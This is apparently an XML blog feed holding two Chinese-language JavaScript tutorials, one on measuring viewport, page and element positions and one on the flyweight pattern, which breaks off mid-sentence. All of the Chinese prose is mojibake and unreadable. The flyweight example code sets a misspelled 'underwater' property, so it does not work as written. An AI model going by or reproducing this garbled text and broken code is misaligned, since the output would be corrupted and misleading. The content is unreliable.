    <content type="text"><![CDATA[åŽŸæ–‡åœ°å€ï¼šç”¨JavascriptèŽ·å–é¡µé¢å…ƒç´ çš„ä½ç½® ç”¨JavascriptèŽ·å–é¡µé¢å…ƒç´ çš„ä½ç½®åˆ¶ä½œç½‘é¡µçš„è¿‡ç¨‹ä¸­ï¼Œä½ æœ‰æ—¶å€™éœ€è¦çŸ¥é“æŸä¸ªå…ƒç´ åœ¨ç½‘é¡µä¸Šçš„ç¡®åˆ‡ä½ç½®ã€‚ ä¸‹é¢çš„æ•™ç¨‹æ€»ç»“äº†Javascriptåœ¨ç½‘é¡µå®šä½æ–¹é¢çš„ç›¸å…³çŸ¥è¯†ã€‚ ç½‘é¡µçš„å¤§å°å’Œæµè§ˆå™¨çª—å£çš„å¤§å°é¦–å…ˆï¼Œè¦æ˜Žç¡®ä¸¤ä¸ªåŸºæœ¬æ¦‚å¿µã€‚ ä¸€å¼ ç½‘é¡µçš„å…¨éƒ¨é¢ç§¯ï¼Œå°±æ˜¯å®ƒçš„å¤§å°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç½‘é¡µçš„å¤§å°ç”±å†…å®¹å’ŒCSSæ ·å¼è¡¨å†³å®šã€‚ æµè§ˆå™¨çª—å£çš„å¤§å°ï¼Œåˆ™æ˜¯æŒ‡åœ¨æµè§ˆå™¨çª—å£ä¸­çœ‹åˆ°çš„é‚£éƒ¨åˆ†ç½‘é¡µé¢ç§¯ï¼Œåˆå«åšviewportï¼ˆè§†å£ï¼‰ã€‚ å¾ˆæ˜¾ç„¶ï¼Œå¦‚æžœç½‘é¡µçš„å†…å®¹èƒ½å¤Ÿåœ¨æµè§ˆå™¨çª—å£ä¸­å…¨éƒ¨æ˜¾ç¤ºï¼ˆä¹Ÿå°±æ˜¯ä¸å‡ºçŽ°æ»šåŠ¨æ¡ï¼‰ï¼Œé‚£ä¹ˆç½‘é¡µçš„å¤§å°å’Œæµè§ˆå™¨çª—å£çš„å¤§å°æ˜¯ç›¸ç­‰çš„ã€‚å¦‚æžœä¸èƒ½å…¨éƒ¨æ˜¾ç¤ºï¼Œåˆ™æ»šåŠ¨æµè§ˆå™¨çª—å£ï¼Œå¯ä»¥æ˜¾ç¤ºå‡ºç½‘é¡µçš„å„ä¸ªéƒ¨åˆ†ã€‚ èŽ·å–ç½‘é¡µçš„å¤§å°ç½‘é¡µä¸Šçš„æ¯ä¸ªå…ƒç´ ï¼Œéƒ½æœ‰clientHeightå’ŒclientWidthå±žæ€§ã€‚è¿™ä¸¤ä¸ªå±žæ€§æŒ‡å…ƒç´ çš„å†…å®¹éƒ¨åˆ†å†åŠ ä¸Špaddingçš„æ‰€å æ®çš„è§†è§‰é¢ç§¯ï¼Œä¸åŒ…æ‹¬borderå’Œæ»šåŠ¨æ¡å ç”¨çš„ç©ºé—´ã€‚ ï¼ˆå›¾ä¸€ clientHeightå’ŒclientWidthå±žæ€§ï¼‰ å› æ­¤ï¼Œdocumentå…ƒç´ çš„clientHeightå’ŒclientWidthå±žæ€§ï¼Œå°±ä»£è¡¨äº†ç½‘é¡µçš„å¤§å°ã€‚ 12345678910111213 function getViewport()&#123; if (document.compatMode == "BackCompat")&#123; return &#123; width: document.body.clientWidth, height: document.body.clientHeight &#125; &#125; else &#123; return &#123; width: document.documentElement.clientWidth, height: document.documentElement.clientHeight &#125; &#125; &#125; ä¸Šé¢çš„getViewportå‡½æ•°å°±å¯ä»¥è¿”å›žæµè§ˆå™¨çª—å£çš„é«˜å’Œå®½ã€‚ä½¿ç”¨çš„æ—¶å€™ï¼Œæœ‰ä¸‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼š 1ï¼‰è¿™ä¸ªå‡½æ•°å¿…é¡»åœ¨é¡µé¢åŠ è½½å®ŒæˆåŽæ‰èƒ½è¿è¡Œï¼Œå¦åˆ™documentå¯¹è±¡è¿˜æ²¡ç”Ÿæˆï¼Œæµè§ˆå™¨ä¼šæŠ¥é”™ã€‚ 2ï¼‰å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯document.documentElement.clientWidthè¿”å›žæ­£ç¡®å€¼ã€‚ä½†æ˜¯ï¼Œåœ¨IE6çš„quirksæ¨¡å¼ä¸­ï¼Œdocument.body.clientWidthè¿”å›žæ­£ç¡®çš„å€¼ï¼Œå› æ­¤å‡½æ•°ä¸­åŠ å…¥äº†å¯¹æ–‡æ¡£æ¨¡å¼çš„åˆ¤æ–­ã€‚ 3ï¼‰clientWidthå’ŒclientHeightéƒ½æ˜¯åªè¯»å±žæ€§ï¼Œä¸èƒ½å¯¹å®ƒä»¬èµ‹å€¼ã€‚ èŽ·å–ç½‘é¡µå¤§å°çš„å¦ä¸€ç§æ–¹æ³• ç½‘é¡µä¸Šçš„æ¯ä¸ªå…ƒç´ è¿˜æœ‰scrollHeightå’ŒscrollWidthå±žæ€§ï¼ŒæŒ‡åŒ…å«æ»šåŠ¨æ¡åœ¨å†…çš„è¯¥å…ƒç´ çš„è§†è§‰é¢ç§¯ã€‚ é‚£ä¹ˆï¼Œdocumentå¯¹è±¡çš„scrollHeightå’ŒscrollWidthå±žæ€§å°±æ˜¯ç½‘é¡µçš„å¤§å°ï¼Œæ„æ€å°±æ˜¯æ»šåŠ¨æ¡æ»šè¿‡çš„æ‰€æœ‰é•¿åº¦å’Œå®½åº¦ã€‚ ä»¿ç…§getViewport()å‡½æ•°ï¼Œå¯ä»¥å†™å‡ºgetPagearea()å‡½æ•°ã€‚ 12345678910111213 function getPagearea()&#123; if (document.compatMode == "BackCompat")&#123; return &#123; width: document.body.scrollWidth, height: document.body.scrollHeight &#125; &#125; else &#123; return &#123; width: document.documentElement.scrollWidth, height: document.documentElement.scrollHeight &#125; &#125; &#125; ä½†æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªé—®é¢˜ã€‚å¦‚æžœç½‘é¡µå†…å®¹èƒ½å¤Ÿåœ¨æµè§ˆå™¨çª—å£ä¸­å…¨éƒ¨æ˜¾ç¤ºï¼Œä¸å‡ºçŽ°æ»šåŠ¨æ¡ï¼Œé‚£ä¹ˆç½‘é¡µçš„clientWidthå’ŒscrollWidthåº”è¯¥ç›¸ç­‰ã€‚ä½†æ˜¯å®žé™…ä¸Šï¼Œä¸åŒæµè§ˆå™¨æœ‰ä¸åŒçš„å¤„ç†ï¼Œè¿™ä¸¤ä¸ªå€¼æœªå¿…ç›¸ç­‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦å–å®ƒä»¬ä¹‹ä¸­è¾ƒå¤§çš„é‚£ä¸ªå€¼ï¼Œå› æ­¤è¦å¯¹getPagearea()å‡½æ•°è¿›è¡Œæ”¹å†™ã€‚ 1234567891011121314151617 function getPagearea()&#123; if (document.compatMode == "BackCompat")&#123; return &#123; width: Math.max(document.body.scrollWidth, document.body.clientWidth), height: Math.max(document.body.scrollHeight, document.body.clientHeight) &#125; &#125; else &#123; return &#123; width: Math.max(document.documentElement.scrollWidth, document.documentElement.clientWidth), height: Math.max(document.documentElement.scrollHeight, document.documentElement.clientHeight) &#125; &#125; &#125; èŽ·å–ç½‘é¡µå…ƒç´ çš„ç»å¯¹ä½ç½®ç½‘é¡µå…ƒç´ çš„ç»å¯¹ä½ç½®ï¼ŒæŒ‡è¯¥å…ƒç´ çš„å·¦ä¸Šè§’ç›¸å¯¹äºŽæ•´å¼ ç½‘é¡µå·¦ä¸Šè§’çš„åæ ‡ã€‚è¿™ä¸ªç»å¯¹ä½ç½®è¦é€šè¿‡è®¡ç®—æ‰èƒ½å¾—åˆ°ã€‚ é¦–å…ˆï¼Œæ¯ä¸ªå…ƒç´ éƒ½æœ‰offsetTopå’ŒoffsetLeftå±žæ€§ï¼Œè¡¨ç¤ºè¯¥å…ƒç´ çš„å·¦ä¸Šè§’ä¸Žçˆ¶å®¹å™¨ï¼ˆoffsetParentå¯¹è±¡ï¼‰å·¦ä¸Šè§’çš„è·ç¦»ã€‚æ‰€ä»¥ï¼Œåªéœ€è¦å°†è¿™ä¸¤ä¸ªå€¼è¿›è¡Œç´¯åŠ ï¼Œå°±å¯ä»¥å¾—åˆ°è¯¥å…ƒç´ çš„ç»å¯¹åæ ‡ã€‚ ï¼ˆå›¾äºŒ offsetTopå’ŒoffsetLeftå±žæ€§ï¼‰ ä¸‹é¢ä¸¤ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥èŽ·å–ç»å¯¹ä½ç½®çš„æ¨ªåæ ‡å’Œçºµåæ ‡ã€‚ 1234567891011121314151617181920212223 function getElementLeft(element)&#123; var actualLeft = element.offsetLeft; var current = element.offsetParent; while (current !== null)&#123; actualLeft += current.offsetLeft; current = current.offsetParent; &#125; return actualLeft; &#125; function getElementTop(element)&#123; var actualTop = element.offsetTop; var current = element.offsetParent; while (current !== null)&#123; actualTop += current.offsetTop; current = current.offsetParent; &#125; return actualTop; &#125; ç”±äºŽåœ¨è¡¨æ ¼å’Œiframeä¸­ï¼ŒoffsetParentå¯¹è±¡æœªå¿…ç­‰äºŽçˆ¶å®¹å™¨ï¼Œæ‰€ä»¥ä¸Šé¢çš„å‡½æ•°å¯¹äºŽè¡¨æ ¼å’Œiframeä¸­çš„å…ƒç´ ä¸é€‚ç”¨ã€‚ èŽ·å–ç½‘é¡µå…ƒç´ çš„ç›¸å¯¹ä½ç½®ç½‘é¡µå…ƒç´ çš„ç›¸å¯¹ä½ç½®ï¼ŒæŒ‡è¯¥å…ƒç´ å·¦ä¸Šè§’ç›¸å¯¹äºŽæµè§ˆå™¨çª—å£å·¦ä¸Šè§’çš„åæ ‡ã€‚ æœ‰äº†ç»å¯¹ä½ç½®ä»¥åŽï¼ŒèŽ·å¾—ç›¸å¯¹ä½ç½®å°±å¾ˆå®¹æ˜“äº†ï¼Œåªè¦å°†ç»å¯¹åæ ‡å‡åŽ»é¡µé¢çš„æ»šåŠ¨æ¡æ»šåŠ¨çš„è·ç¦»å°±å¯ä»¥äº†ã€‚æ»šåŠ¨æ¡æ»šåŠ¨çš„åž‚ç›´è·ç¦»ï¼Œæ˜¯documentå¯¹è±¡çš„scrollTopå±žæ€§ï¼›æ»šåŠ¨æ¡æ»šåŠ¨çš„æ°´å¹³è·ç¦»æ˜¯documentå¯¹è±¡çš„scrollLeftå±žæ€§ã€‚ ï¼ˆå›¾ä¸‰ scrollTopå’ŒscrollLeftå±žæ€§ï¼‰ å¯¹ä¸Šä¸€èŠ‚ä¸­çš„ä¸¤ä¸ªå‡½æ•°è¿›è¡Œç›¸åº”çš„æ”¹å†™ï¼š 1234567891011121314151617181920212223242526272829303132333435 function getElementViewLeft(element)&#123; var actualLeft = element.offsetLeft; var current = element.offsetParent; while (current !== null)&#123; actualLeft += current.offsetLeft; current = current.offsetParent; &#125; if (document.compatMode == "BackCompat")&#123; var elementScrollLeft=document.body.scrollLeft; &#125; else &#123; var elementScrollLeft=document.documentElement.scrollLeft; &#125; return actualLeft-elementScrollLeft; &#125; function getElementViewTop(element)&#123; var actualTop = element.offsetTop; var current = element.offsetParent; while (current !== null)&#123; actualTop += current. offsetTop; current = current.offsetParent; &#125; if (document.compatMode == "BackCompat")&#123; var elementScrollTop=document.body.scrollTop; &#125; else &#123; var elementScrollTop=document.documentElement.scrollTop; &#125; return actualTop-elementScrollTop; &#125; scrollTopå’ŒscrollLeftå±žæ€§æ˜¯å¯ä»¥èµ‹å€¼çš„ï¼Œå¹¶ä¸”ä¼šç«‹å³è‡ªåŠ¨æ»šåŠ¨ç½‘é¡µåˆ°ç›¸åº”ä½ç½®ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨å®ƒä»¬æ”¹å˜ç½‘é¡µå…ƒç´ çš„ç›¸å¯¹ä½ç½®ã€‚å¦å¤–ï¼Œelement.scrollIntoView()æ–¹æ³•ä¹Ÿæœ‰ç±»ä¼¼ä½œç”¨ï¼Œå¯ä»¥ä½¿ç½‘é¡µå…ƒç´ å‡ºçŽ°åœ¨æµè§ˆå™¨çª—å£çš„å·¦ä¸Šè§’ã€‚ èŽ·å–å…ƒç´ ä½ç½®çš„å¿«é€Ÿæ–¹æ³•é™¤äº†ä¸Šé¢çš„å‡½æ•°ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ç§å¿«é€Ÿæ–¹æ³•ï¼Œå¯ä»¥ç«‹åˆ»èŽ·å¾—ç½‘é¡µå…ƒç´ çš„ä½ç½®ã€‚ é‚£å°±æ˜¯ä½¿ç”¨getBoundingClientRect()æ–¹æ³•ã€‚å®ƒè¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†leftã€rightã€topã€bottomå››ä¸ªå±žæ€§ï¼Œåˆ†åˆ«å¯¹åº”äº†è¯¥å…ƒç´ çš„å·¦ä¸Šè§’å’Œå³ä¸‹è§’ç›¸å¯¹äºŽæµè§ˆå™¨çª—å£ï¼ˆviewportï¼‰å·¦ä¸Šè§’çš„è·ç¦»ã€‚ æ‰€ä»¥ï¼Œç½‘é¡µå…ƒç´ çš„ç›¸å¯¹ä½ç½®å°±æ˜¯ 12var X= this.getBoundingClientRect().left;var Y =this.getBoundingClientRect().top; å†åŠ ä¸Šæ»šåŠ¨è·ç¦»ï¼Œå°±å¯ä»¥å¾—åˆ°ç»å¯¹ä½ç½® 12var X= this.getBoundingClientRect().left+document.documentElement.scrollLeft;var Y =this.getBoundingClientRect().top+document.documentElement.scrollTop;]]></content>
      <categories>
        <category>è½¬è½½å¥½æ–‡</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”äº«å…ƒæ¨¡å¼]]></title>
    <url>%2F2019-03-06-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”äº«å…ƒæ¨¡å¼äº«å…ƒï¼ˆflyweightï¼‰æ¨¡å¼æ˜¯ä¸€ç§ç”¨äºŽæ€§èƒ½ä¼˜åŒ–çš„æ¨¡å¼ï¼Œâ€˜flyâ€™ åœ¨è¿™é‡Œæ˜¯è‹è‡çš„æ„æ€ï¼Œæ„ä¸ºè‡é‡çº§ã€‚äº«å…ƒæ¨¡å¼çš„æ ¸å¿ƒæ˜¯è¿ç”¨å…±äº«æŠ€æœ¯æ¥æœ‰æ•ˆæ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚ å¦‚æžœç³»ç»Ÿä¸­å› ä¸ºåˆ›å»ºäº†å¤§é‡ç±»ä¼¼çš„å¯¹è±¡è€Œå¯¼è‡´å†…å­˜å ç”¨è¿‡é«˜ï¼Œäº«å…ƒæ¨¡å¼å°±éžå¸¸æœ‰ç”¨äº†ã€‚åœ¨ JavaScript ä¸­ï¼Œæµè§ˆå™¨ç‰¹åˆ«æ˜¯ç§»åŠ¨ç«¯çš„æµè§ˆå™¨åˆ†é…çš„å†…å­˜å¹¶ä¸ç®—å¤šï¼Œå¦‚ä½•èŠ‚çœå†…å­˜å°±æˆäº† ä¸€ä»¶éžå¸¸æœ‰æ„ä¹‰çš„äº‹æƒ…ã€‚ åˆè¯†äº«å…ƒæ¨¡å¼å‡è®¾æœ‰ä¸ªå†…è¡£å·¥åŽ‚ï¼Œç›®å‰çš„äº§å“æœ‰ 50 ç§ç”·å¼å†…è¡£å’Œ 50 ç§å¥³å£«å†…è¡£ï¼Œä¸ºäº†æŽ¨é”€äº§å“ï¼Œå·¥åŽ‚å†³å®šç”Ÿäº§ä¸€äº›å¡‘æ–™æ¨¡ç‰¹æ¥ç©¿ä¸Šä»–ä»¬çš„å†…è¡£æ‹æˆå¹¿å‘Šç…§ç‰‡ã€‚ æ­£å¸¸æƒ…å†µä¸‹éœ€è¦ 50 ä¸ªç”·æ¨¡ç‰¹å’Œ 50 ä¸ªå¥³æ¨¡ç‰¹ï¼Œç„¶åŽè®©ä»–ä»¬æ¯äººåˆ†åˆ«ç©¿ä¸Šä¸€ä»¶å†…è¡£æ¥æ‹ç…§ã€‚ä¸ä½¿ç”¨äº«å…ƒæ¨¡å¼çš„æƒ…å†µä¸‹ï¼Œåœ¨ç¨‹åºé‡Œä¹Ÿè®¸ä¼šè¿™æ ·å†™ 123456789101112131415var Model = function(sex,underwear)&#123; this.sex = sex; this.underwear = underwear;&#125;Model.prototype.takePhoto = function()&#123; console.log('sex='+this.sex + 'underwear='+this.underwear);&#125;for(var i=1;i&lt;=50;i++)&#123; var maleModel = new Model('male','underwear'+i); maleModel.takePhoto();&#125;for(var i=1;i&lt;=50;i++)&#123; var femaleModel = new Model('female','underwear'+i); femaleModel.takePhoto();&#125; è¦å¾—åˆ°ä¸€å¼ ç…§ç‰‡ï¼Œæ¯æ¬¡éƒ½éœ€è¦ä¼ å…¥ sex å’Œ underwear å‚æ•°ï¼Œå¦‚ä¸Šæ‰€è¿°ï¼ŒçŽ°åœ¨ä¸€å…±æœ‰ 50 ç§ç”·å†…è¡£å’Œ 50 ç§å¥³å†…è¡£ï¼Œæ‰€ä»¥ä¸€å…±ä¼šäº§ç”Ÿ 100 ä¸ªå¯¹è±¡ã€‚å¦‚æžœå°†æ¥ç”Ÿäº§äº† 10000 ç§å†…è¡£ï¼Œé‚£è¿™ä¸ªç¨‹åºå¯èƒ½ä¼šå› ä¸ºå­˜åœ¨å¦‚æ­¤å¤šçš„å¯¹è±¡å·²ç»æå‰å´©æºƒ. è™½ç„¶æœ‰ 100 ç§å†…è¡£ï¼Œä½†å¾ˆæ˜¾ç„¶å¹¶ä¸éœ€è¦ 50 ä¸ªç”·æ¨¡ç‰¹å’Œ 50 ä¸ªå¥³æ¨¡ç‰¹ã€‚å…¶å®žç”·æ¨¡ç‰¹å’Œå¥³æ¨¡ç‰¹å„è‡ªæœ‰ä¸€ä¸ªå°±è¶³å¤Ÿäº†ï¼Œä»–ä»¬å¯ä»¥åˆ†åˆ«ç©¿ä¸Šä¸åŒçš„å†…è¡£æ¥æ‹ç…§ 1234567891011121314151617181920// æŠŠ underwear å‚æ•°ä»Žæž„é€ å‡½æ•°ä¸­ç§»é™¤ï¼Œæž„é€ å‡½æ•°åªæŽ¥æ”¶ sex å‚æ•°ï¼švar Model = function(sex,underwear)&#123; this.sex = sex;&#125;Model.prototype.takePhoto = function()&#123; console.log('sex='+this.sex + 'underwear='+this.underwear);&#125;// åˆ†åˆ«åˆ›å»ºä¸€ä¸ªç”·æ¨¡ç‰¹å¯¹è±¡å’Œä¸€ä¸ªå¥³æ¨¡ç‰¹å¯¹è±¡var maleModel = new Model('male');var femaleModel = new Model('female');// ç»™ç”·æ¨¡ç‰¹ä¾æ¬¡ç©¿ä¸Šæ‰€æœ‰çš„ç”·è£…ï¼Œå¹¶è¿›è¡Œæ‹ç…§ï¼šfor(var i=1;i&lt;=50;i++)&#123; maleModel.underwater = 'underwater' + i; maleModel.takePhoto();&#125;// ç»™å¥³æ¨¡ç‰¹ä¾æ¬¡ç©¿ä¸Šæ‰€æœ‰çš„ç”·è£…ï¼Œå¹¶è¿›è¡Œæ‹ç…§ï¼šfor(var i=1;i&lt;=50;i++)&#123; femaleModel.underwater = 'underwater' + i; femaleModel.takePhoto();&#125; å†…éƒ¨çŠ¶æ€ä¸Žå¤–éƒ¨çŠ¶æ€äº«å…ƒæ¨¡å¼è¦æ±‚å°†å¯¹è±¡çš„å±žæ€§åˆ’åˆ†ä¸ºå†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€ï¼ˆçŠ¶æ€åœ¨è¿™é‡Œé€šå¸¸æ˜¯æŒ‡å±žæ€§ï¼‰ã€‚äº«å…ƒæ¨¡å¼çš„ç›®æ ‡æ˜¯å°½é‡å‡å°‘å…±äº«å¯¹è±¡çš„æ•°é‡ï¼Œå¦‚ä½•åˆ’åˆ†å®ƒä»¬ï¼Œä¸‹é¢æœ‰å‡ æ¡ç»éªŒä½œä¸ºæŒ‡å¼•ï¼š å†…éƒ¨çŠ¶æ€å­˜å‚¨äºŽå¯¹è±¡å†…éƒ¨ å†…éƒ¨çŠ¶æ€å¯ä»¥è¢«ä¸€äº›å¯¹è±¡å…±äº« å†…éƒ¨çŠ¶æ€ç‹¬ç«‹äºŽå…·ä½“çš„åœºæ™¯ï¼Œé€šå¸¸ä¸ä¼šæ”¹å˜ å¤–éƒ¨çŠ¶æ€å–å†³äºŽå…·ä½“çš„åœºæ™¯ï¼Œå¹¶ä¸”æ ¹æ®åœºæ™¯çš„å˜åŒ–è€Œå˜åŒ–ï¼Œå¤–éƒ¨çŠ¶æ€ä¸èƒ½è¢«å…±äº« æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰å†…éƒ¨çŠ¶æ€ç›¸åŒçš„å¯¹è±¡éƒ½æŒ‡å®šä¸ºåŒä¸€ä¸ªå…±äº«çš„å¯¹è±¡ã€‚è€Œå¤–éƒ¨çŠ¶æ€å¯ä»¥ä»Žå¯¹è±¡ä¸Šå‰¥ç¦»å‡ºæ¥ï¼Œå¹¶å­˜å‚¨åœ¨å¤–éƒ¨ã€‚ å‰¥ç¦»äº†å¤–éƒ¨çŠ¶æ€çš„å¯¹è±¡æˆä¸ºå…±äº«å¯¹è±¡ï¼Œå¤–éƒ¨çŠ¶æ€åœ¨å¿…è¦çš„æ—¶å€™è¢«ä¼ å…¥å…±äº«å¯¹è±¡æ¥ç»„è£…æˆä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡ã€‚è™½ç„¶ç»„è£…å¤–éƒ¨çŠ¶æ€æˆä¸ºäº†ä¸€ä¸ªå®Œæ•´å¯¹è±¡çš„è¿‡ç¨‹éœ€è¦ä¸€å®šçš„æ—¶é—´ï¼Œä½†å´å¯ä»¥å¤§å¤§å‡å°‘ç³»ç»Ÿä¸­çš„å¯¹è±¡æ•°é‡ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œè¿™ç‚¹æ—¶é—´æˆ–è®¸æ˜¯å¾®ä¸è¶³é“çš„ã€‚å› æ­¤ï¼Œäº«å…ƒæ¨¡å¼æ˜¯ä¸€ç§ç”¨æ—¶é—´æ¢ç©ºé—´çš„ä¼˜åŒ–æ¨¡å¼ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ€§åˆ«æ˜¯å†…éƒ¨çŠ¶æ€ï¼Œå†…è¡£æ˜¯å¤–éƒ¨çŠ¶æ€ï¼Œé€šè¿‡åŒºåˆ†è¿™ä¸¤ç§çŠ¶æ€ï¼Œå¤§å¤§å‡å°‘äº†ç³»ç»Ÿä¸­çš„å¯¹è±¡æ•°é‡ã€‚é€šå¸¸æ¥è¯´ï¼Œå†…éƒ¨çŠ¶æ€æœ‰å¤šå°‘ç§ç»„åˆï¼Œç³»ç»Ÿä¸­ä¾¿æœ€å¤šå­˜åœ¨å¤šå°‘ä¸ªå¯¹è±¡ï¼Œå› ä¸ºæ€§åˆ«é€šå¸¸åªæœ‰ç”·å¥³ä¸¤ç§ï¼Œæ‰€æœ‰è¯¥å†…è¡£åŽ‚å•†æœ€å¤šéœ€è¦2ä¸ªå¯¹è±¡ã€‚ ä½¿ç”¨äº«å…ƒæ¨¡å¼çš„å…³é”®æ˜¯å¦‚ä½•åŒºåˆ†å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€ã€‚å¯ä»¥è¢«å¯¹è±¡å…±äº«çš„å±žæ€§é€šå¸¸è¢«åˆ’åˆ†ä¸ºå†…éƒ¨çŠ¶æ€ï¼Œå¦‚åŒä¸ç®¡ä»€ä¹ˆæ ·å¼çš„è¡£æœï¼Œéƒ½å¯ä»¥æŒ‰ç…§æ€§åˆ«çš„ä¸åŒï¼Œç©¿åœ¨åŒä¸€ä¸ªç”·æ¨¡ç‰¹æˆ–è€…å¥³æ¨¡ç‰¹èº«ä¸Šã€‚æ¨¡ç‰¹çš„æ€§åˆ«å°±å¯ä»¥ä½œä¸ºå†…éƒ¨å­˜å‚¨åœ¨å…±äº«å¯¹è±¡å†…éƒ¨ã€‚è€Œå¤–éƒ¨çŠ¶æ€å–å†³äºŽå…·ä½“çš„åœºæ™¯ï¼Œå¹¶æ ¹æ®åœºæ™¯äºŒå˜åŒ–ï¼Œå°±åƒä¾‹å­ä¸­æ¯ä»¶è¡£æœéƒ½æ˜¯ä¸åŒçš„ï¼Œå®ƒä»¬ä¸èƒ½è¢«ä¸€äº›å¯¹è±¡å…±äº«ï¼Œå› æ­¤åªèƒ½è¢«åˆ’åˆ†ä¸ºå¤–éƒ¨çŠ¶æ€ã€‚ äº«å…ƒæ¨¡å¼çš„é€šç”¨ç»“æž„ä¸Šé¢ä¾‹å­ä¸­è¿˜ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„äº«å…ƒæ¨¡å¼ï¼Œè¿˜å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ã€‚ æˆ‘ä»¬é€šè¿‡æž„é€ å‡½æ•°æ˜¾å¼ new å‡ºäº†ç”·å¥³ä¸¤ä¸ª model å¯¹è±¡ï¼Œåœ¨å…¶ä»–ç³»ç»Ÿä¸­ï¼Œä¹Ÿè®¸è¿™å¹¶ä¸æ˜¯ä¸€å¼€å§‹å°±éœ€è¦æ‰€æœ‰çš„å…±äº«å¯¹è±¡ã€‚ ç»™ model å¯¹è±¡æ‰‹åŠ¨è®¾ç½®äº† underwater å¤–éƒ¨çŠ¶æ€ï¼Œåœ¨æ›´å¤æ‚çš„ç³»ç»Ÿä¸­ï¼Œè¿™å¹¶ä¸æ˜¯æœ€å¥½çš„æ–¹å¼ï¼Œå› ä¸ºå¤–éƒ¨çŠ¶æ€å¯èƒ½ä¼šç›¸å½“å¤æ‚ï¼Œå®ƒä»¬ä¸Žå…±äº«å¯¹è±¡çš„è”ç³»ä¼šå˜å¾—æ›´åŠ å›°éš¾ã€‚ æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå¯¹è±¡å·¥åŽ‚æ¥è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œåªæœ‰å½“æŸç§å…±äº«å¯¹è±¡è¢«çœŸæ­£éœ€è¦çš„æ—¶å€™ï¼Œå®ƒä»Žæ‰å·¥åŽ‚ä¸­è¢«åˆ›å»ºå‡ºæ¥ï¼Œå¯¹äºŽç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªç®¡ç†å™¨æ¥è®°å½•å¯¹è±¡ç›¸å…³çš„å¤–éƒ¨çŠ¶æ€ï¼Œä½¿å¾—è¿™äº›å¤–éƒ¨çŠ¶æ€é€šè¿‡æŸä¸ªé’©å­å’Œå…±äº«å¯¹è±¡è”ç³»èµ·æ¥ã€‚ æ–‡ä»¶ä¸Šä¼ çš„ä¾‹å­åœ¨å¾®äº‘ä¸Šä¼ æ¨¡æ¿çš„å¼€å‘ä¸­ï¼Œä½œè€…æ›¾ç»å€ŸåŠ©äº«å…ƒæ¨¡å¼æå‡äº†ç¨‹åºçš„æ€§èƒ½ã€‚ å¯¹è±¡çˆ†ç‚¸å¾®äº‘çš„æ–‡ä»¶ä¸Šåˆ›åŠŸèƒ½è™½ç„¶å¯ä»¥é€‰æ‹©ä¾ç…§é˜Ÿåˆ—ï¼Œä¸€ä¸ªä¸€ä¸ªæŽ’é˜Ÿä¸Šä¼ ï¼Œä½†ä¹Ÿæ”¯æŒåŒæ—¶é€‰æ‹© 2000 ä¸ªæ–‡ä»¶ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½å¯¹åº”ç€ä¸€ä¸ª JavaScript ä¸Šä¼ å¯¹è±¡çš„åˆ›å»ºï¼Œåœ¨ç¬¬ä¸€ç‰ˆå¼€å‘ä¸­ï¼Œçš„ç¡®å¾€ç¨‹åºé‡Œé¢åŒæ—¶ new äº† 2000ä¸ª upload å¯¹è±¡ï¼Œç»“æžœå¯æƒ³è€ŒçŸ¥ã€‚Chrome ä¸­è¿˜å‹‰å¼ºèƒ½å¤Ÿæ”¯æ’‘ï¼ŒIE ä¸‹ç›´æŽ¥è¿›å…¥å‡æ­»çŠ¶æ€ã€‚ å¾®äº‘æ”¯æŒå¥½å‡ ç§ä¸Šä¼ æ–¹å¼ï¼Œæ¯”å¦‚æµè§ˆå™¨æ’ä»¶ã€Flash å’Œè¡¨å•ä¸Šä¼ ç­‰ï¼Œä¸ºäº†ç®€åŒ–ä¾‹å­ï¼Œä½œè€…å‡è®¾åªæœ‰æ’ä»¶å’Œ Flash 